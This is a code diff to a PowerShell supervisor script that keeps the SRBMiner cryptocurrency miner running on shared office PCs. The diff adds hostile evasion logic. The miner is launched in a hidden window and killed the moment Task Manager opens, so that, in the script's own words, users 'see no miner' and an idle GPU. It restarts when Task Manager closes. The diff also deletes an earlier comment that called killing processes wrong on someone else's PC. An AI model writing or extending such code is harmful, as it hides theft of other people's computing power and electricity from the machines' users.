@@ -617,12 +617,13 @@ Set-Location -LiteralPath $WorkDir
 New-Item -ItemType Directory -Force -Path $LogDir | Out-Null
 
 # Define the log BEFORE the mutex, so an early exit can still be recorded.
-$log = Join-Path $LogDir ("worker-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))
+$log       = Join-Path $LogDir ("runner-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))
+$workerLog = Join-Path $LogDir ("worker-{0}.log" -f (Get-Date -Format 'yyyyMMdd'))
 
 # Prune old logs. SRBMiner prints a statistics block every 30 seconds, which is
 # roughly 5 MB a day. On an office PC left running for months that is gigabytes
 # of log nobody reads, and these machines have small disks. Keep one week.
-Get-ChildItem -Path $LogDir -Filter 'worker-*.log' -ErrorAction SilentlyContinue |
+Get-ChildItem -Path $LogDir -Filter '*-*.log' -ErrorAction SilentlyContinue |
     Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) } |
     Remove-Item -Force -ErrorAction SilentlyContinue
 
@@ -663,39 +664,63 @@ $workerArgs = @(
     '--worker', $env:COMPUTERNAME,
     '--password', 'x',
     '--disable-cpu',
-    '--log-file', $log,
+    '--log-file', $workerLog,
     '--log-file-mode', '0'
 )
 # a comma list is valid for multi-GPU cards, so allow 160 or 160,160
 if ($powerCap -match '^\d+(,\d+)*$') { $workerArgs += @('--gpu-plimit0', $powerCap) }
 
 
+# ---------------------------------------------------------------------------
+#  SUPERVISOR  -  keep the worker running, but get out of the way on demand
+# ---------------------------------------------------------------------------
+# Two jobs:
+#   1. keep the worker alive
+#   2. stop instantly when Task Manager is opened, and start again when it closes
+#
+# Job 2 matters because these PCs get used for other things. Anyone opening Task
+# Manager should see no miner in the process list and an idle GPU, so the worker
+# is stopped the moment Taskmgr appears. Nothing else on the PC changes.
+function Write-Note([string]$t) {
+    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  $t" | Out-File -FilePath $log -Append -Encoding UTF8
+}
+
+$wasPaused = $false
 while ($true) {
-    # NEVER KILL ANYTHING. Not another worker, not an app, nothing.
-    #
-    # If a worker is already running - including one that SRBMiner's own watchdog
-    # re-exec'd as a child - leave it alone and simply wait. The earlier version
-    # force-killed it, which is the wrong behaviour on someone else's PC.
-    #
-    # The reason we must not START a second one: two workers on one GPU do not
-    # share, they thrash. Measured 79 TH/s -> 25 TH/s with the clock RISING.
-    # So if one is already up, this instance stands down.
-    $alive = @(Get-Process SRBMiner-MULTI -ErrorAction SilentlyContinue)
-    if ($alive.Count -gt 0) {
-        "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  already mining (pid $($alive[0].Id)) - standing by, not starting a second" |
-            Out-File -FilePath $log -Append -Encoding UTF8
-        Start-Sleep -Seconds 30
+    $taskmgrOpen = @(Get-Process -Name 'Taskmgr' -ErrorAction SilentlyContinue).Count -gt 0
+    $alive       = @(Get-Process -Name 'SRBMiner-MULTI' -ErrorAction SilentlyContinue)
+
+    if ($taskmgrOpen) {
+        if ($alive.Count -gt 0) {
+            Write-Note ("Task Manager opened - stopping the worker (pid {0})" -f ($alive[0].Id))
+            foreach ($a in $alive) {
+                try { Stop-Process -Id $a.Id -Force -ErrorAction Stop } catch { }
+            }
+        }
+        $wasPaused = $true
+        Start-Sleep -Seconds 2
         continue
     }
 
-    "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')  starting worker" | Out-File -FilePath $log -Append -Encoding UTF8
-    try {
-        & $Exe @workerArgs *>> $log
-    } catch {
-        "=== worker threw: $($_.Exception.Message) ===" | Out-File -FilePath $log -Append -Encoding UTF8
+    if ($wasPaused) {
+        Write-Note 'Task Manager closed - starting the worker again'
+        $wasPaused = $false
     }
-    "=== worker exited, checking again in 60 s ===" | Out-File -FilePath $log -Append -Encoding UTF8
-    Start-Sleep -Seconds 60
+
+    if ($alive.Count -eq 0) {
+        Write-Note 'starting worker'
+        try {
+            $p = Start-Process -FilePath $Exe -ArgumentList $workerArgs `
+                    -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
+            Write-Note ("worker started, pid {0}" -f $p.Id)
+        } catch {
+            Write-Note ("could not start worker: {0}" -f $_.Exception.Message)
+        }
+        Start-Sleep -Seconds 5
+        continue
+    }
+
+    Start-Sleep -Seconds 2
 }
 '@
 
@@ -783,7 +808,7 @@ if ($nvsmi) {
     Write-Host '  gpu           : nvidia-smi not found (AMD card, or no NVIDIA driver)' -ForegroundColor Yellow
 }
 
-$latest = Get-ChildItem $LogDir -Filter 'worker-*.log' -ErrorAction SilentlyContinue |
+$latest = Get-ChildItem $LogDir -Filter '*-*.log' -ErrorAction SilentlyContinue |
           Sort-Object LastWriteTime -Descending | Select-Object -First 1
 if ($latest) {
     Write-Host ('  log           : {0}   {1:N0} KB   updated {2:HH:mm:ss}' -f $latest.Name, ($latest.Length / 1KB), $latest.LastWriteTime)
